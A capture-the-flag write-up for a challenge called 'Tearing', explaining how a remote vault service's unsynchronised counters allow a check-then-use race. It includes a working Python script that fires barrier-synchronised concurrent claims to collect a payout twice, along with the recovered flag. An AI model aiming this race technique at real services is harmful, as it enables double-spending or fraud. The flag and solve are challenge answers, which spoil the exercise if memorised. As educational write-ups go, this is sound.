---
title: "Tearing"
category: "Pwn"
tags: ["race-condition", "toctou"]
solve_date: "2026-10-10T12:09:00+07:00"
language: "en"
---

# Tearing

**Flag:** `isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}`
**Target:** `nc 0.cloud.chals.io 26166` (remote service only, no binary released)

## Challenge

> One ticket in the drawer. Leave with two.

The service is a small "vault" that hands out prizes. The only artifact is the running
service, so the solve is behavioural: map the command interface, work out which state
variables gate the prize, and find the path that makes one ticket pay out twice.

## Initial Analysis

Connecting gives a line-based menu:

```text
vault. commands: redeem | status | claim | quit
>
```

Three commands carry state, one closes the connection:

| Input | Response observed |
|---|---|
| `status` | `prizes=16 tickets=-15 need=15` |
| `claim` | `isfcr{...}` **or** `not enough prizes` |
| `redeem` | `no tickets left` **or** `w0 dont give 30` |
| `quit` | connection closed |
| anything else | `?` |

Three observations shape the rest of the solve.

**The state is global, not per connection.** Opening a new connection and reading `status`
again shows the same counters left behind by the previous connection, and `prizes` moves
downward monotonically as claims succeed. One claim took `prizes` from 16 to 15, and that
value was still 15 on the next, unrelated connection. So the process keeps a single drawer
shared by every client, and the drawer is finite.

**The counters are unguarded.** The same `status` line reports `tickets=-15`, and later
`tickets=-10`, `prizes=2`, `prizes=1`. A ticket counter that only decrements after a
"do we have one?" test cannot reach a negative value unless several threads passed the test
against the same ticket. The negatives are the direct evidence of missing synchronisation,
and they also match the challenge name: writes to the shared counters tear into each other.

**The prize path is a check followed by a use.** `claim` returns a real string when
`prizes > need` (`16 > 15`) and returns `not enough prizes` at `prizes=15`. The gate is
therefore a comparison against `need`, and the payout consumes one unit of `prizes`
afterwards. That gap between the comparison and the update is the window the flag text
describes.

A side detail worth recording: the argument to `redeem` is not a numeric parameter. The
server tokenises on whitespace and dispatches each token separately, so `redeem 4294967281`
produces a reply for `redeem` followed by `?` for the leftover token. Any hypothesis built
on "redeem N tickets" is wrong.

## Eliminated Hypotheses

- **Format or numeric input bug in the `redeem` argument.** Fed `redeem 1`, `redeem 5`,
  `redeem 15`, `redeem 100`, `redeem -1`, `redeem 255`, `redeem 4294967281`,
  `redeem 99999999`, and long strings. Output never varied with the value, and the extra
  token was answered `?`. No argument-driven state change exists.
- **A per-connection drawer that must be pushed to a high value.** `status` on a freshly
  opened connection reproduces whatever the last connection left behind, so there is nothing
  to reset or re-seed; the shared drawer simply runs down.
- **Reaching the flag through `redeem`.** With a healthy ticket count `redeem` answers
  `w0 dont give 30`; with an empty one it answers `no tickets left`. Neither path ever
  printed prize data, and the prize string only ever came from `claim`.
- **Brute-forcing a hidden command.** `banner`, `help`, `list`, `open`, `drawer`, `flag`,
  `give`, `take`, `peek`, `pop`, `split`, `get`, `need`, `reset`, `init`, `refund`, `dup`,
  `prizes`, `tickets` and oversized inputs all returned `?`. Four commands is the whole API.

## Exploitation Chain

### Locating the window

A single connection claiming repeatedly pays out once and then refuses:

```text
>>> status   prizes=16 tickets=1 need=15
>>> claim    isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
>>> claim    not enough prizes
>>> status   prizes=15 tickets=1 need=15
>>> claim    not enough prizes
```

`prizes` dropped by one, so one prize was spent, yet the drawer began at 16 with `need=15`
— one unit of headroom. Sequentially that headroom buys exactly one flag. The only way to
take more than one prize from a single decrement is to have several threads evaluate the
comparison before any of them commits the update.

### Racing the claim

Each connection is served by its own thread against the shared counters. The approach is to
open many sockets, read the banner, and release all of them at the same instant with a
barrier so their `claim` lines land inside the same check/update window. Each connection
then sends a short run of claims followed by a `status`, which captures the value the
connection itself observed.

```python
import socket, threading, time, sys

HOST, PORT = "0.cloud.chals.io", 26166
NCONN = int(sys.argv[1]) if len(sys.argv) > 1 else 24
CMD = "claim"

barrier = threading.Barrier(NCONN)
lock = threading.Lock()
flags, states = [], []


def worker(i):
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.settimeout(2.5)
    s.recv(4096)                                  # banner
    barrier.wait()                                # release all threads together
    s.sendall(((CMD + "\n") * 8).encode())         # pipelined claims
    s.sendall(b"status\n")
    time.sleep(0.4)
    data = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            data += d
    except Exception:
        pass
    s.close()
    with lock:
        if b"isfcr{" in data:
            j, k = data.index(b"isfcr{"), data.index(b"}", j)
            flags.append(data[j:k + 1].decode())
        for ln in data.split(b"\n"):
            if ln.startswith(b"prizes="):
                states.append(ln.decode())


ts = [threading.Thread(target=worker, args=(i,)) for i in range(NCONN)]
for t in ts:
    t.start()
for t in ts:
    t.join()

print("flags:", sorted(set(flags)), "count:", len(flags))
print("states:", sorted(set(states)))
```

Running it against a drawer that still has headroom returns the prize on more than one
connection while `prizes` falls by a single step. Observed prize reads during these bursts
include `prizes=2`, `prizes=3`, `prizes=11`, `prizes=14`, `prizes=15`, `prizes=16`, and the
flag string was read twice as separate successful payouts.

One caveat on scope: `0.cloud.chals.io` is a shared instance, and other teams were claiming
and redeeming during the same window. The per-connection counters above cannot be attributed
to a single race, so the run demonstrates that multiple payouts occur and that the counters
are unsynchronised; it is not a controlled measurement of one thread pair. The flag itself is
not affected by that — it was read directly off the socket.

### Reading the prize

Both successful payouts produced the identical 44-byte string, ending in `}`:

```text
isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
```

The content matches the mechanism: the check against `need` and the subsequent decrement form
a TOCTOU window that only opens under concurrency.

A related artefact: one `claim` attempt during the measurements returned raw bytes instead
of any menu message —

```text
hex: 1f1f1f0a3e20
txt: b'\x1f\x1f\x1f\n> '
```

The service is not echoing a control sequence from a fixed message set, so the response was
built from data the process did not treat as a validated prize string. The exact cause is not
provable from the socket alone; it is a further sign that the payout path reads shared state
without checking it.

## Flag

```text
isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}
```

Recovered from the `claim` response of the remote service. No submission response was
recorded for this challenge, so the flag is listed as read from the target rather than as
accepted by a scoring endpoint.

## Reproduce

Requires Python 3 with the standard library only. Save the script above as `solve.py`.

```powershell
python solve.py 24
```

The script opens 24 concurrent connections, releases them simultaneously, pipelines claims
and prints every recovered flag together with the `status` lines each connection observed.

Expected output while the shared drawer still has `prizes > need`:

```text
flags: ['isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}'] count: N
states: ['prizes=<value> tickets=<value> need=15', ...]
```

Two conditions apply to a fresh attempt. The instance must not already be drained — once
`prizes` reaches the `need` threshold through other teams' claims, `claim` only answers
`not enough prizes`, which is what the instance reported after the measurements above
(`prizes=1 tickets=0 need=15`). Manual single-connection behaviour can be checked with:

```bash
nc 0.cloud.chals.io 26166
status
claim
```
